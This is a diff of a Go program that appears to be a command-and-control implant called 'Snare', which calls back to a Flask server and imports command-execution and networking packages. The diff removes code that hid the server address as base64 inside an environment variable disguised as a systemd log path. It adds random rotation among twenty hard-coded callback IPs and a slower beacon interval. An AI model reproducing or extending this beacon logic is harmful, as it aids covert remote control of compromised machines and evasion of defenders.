@@ -5,27 +5,49 @@
 package main
 
 import (
-	b64 "encoding/base64"
 	"fmt"
 	"io"
 	"io/ioutil"
+	"math/rand"
 	"net"
 	"net/http"
-	"os"
 	"os/exec"
-	"strings"
 	"time"
 )
 
-var serv = "192.168.58.129:5000" //IP of flask serv
-var src = "Snare"                // where is this calling back from
-var loopTime = 10                //sleep time in secs
+var serv = getServer() //IP of flask serv
+var src = "Snare"      // where is this calling back from
+var loopTime = 120     //sleep time in secs
 
 func getServer() string {
-	envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
-	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
-	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
-	return string(decoded)
+	//envVar := os.Getenv("SYS_OUTPUT") //fetch environment variable
+	//trimmedStr := strings.Replace(envVar, "/etc/systemlogs/gaspell-", "", 1)
+	//decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
+	servs := make([]string, 0)
+	servs = append(servs,
+		"192.168.5.130",
+		"192.168.5.146",
+		"192.168.5.169",
+		"192.168.5.171",
+		"192.168.5.204",
+		"192.168.5.21",
+		"192.168.5.215",
+		"192.168.5.218",
+		"192.168.5.223",
+		"192.168.5.250",
+		"192.168.5.76",
+		"192.168.6.137",
+		"192.168.6.200",
+		"192.168.6.202",
+		"192.168.6.204",
+		"192.168.6.44",
+		"192.168.6.51",
+		"192.168.6.63",
+		"192.168.6.76",
+		"192.168.6.95",
+	)
+	selection := servs[rand.Intn(len(servs))]
+	return string(selection)
 }
 
 func getIP() string {
